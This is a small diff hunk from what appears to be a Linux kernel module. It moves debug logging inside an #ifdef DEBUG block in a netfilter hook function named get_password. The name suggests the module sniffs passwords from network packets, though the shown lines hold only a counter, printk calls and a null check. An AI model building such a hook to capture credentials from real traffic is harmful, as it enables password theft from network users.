@@ -48,11 +48,12 @@ void my_exit_module(void)
  */
 unsigned int get_password(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
 {
-
+#ifdef DEBUG
     static int a=0;
-
     a++;
     printk("get password function trigger %d",a);
+#endif
+
     if (skb == NULL)
     {
         printk(KERN_INFO "skbuf error.\n");
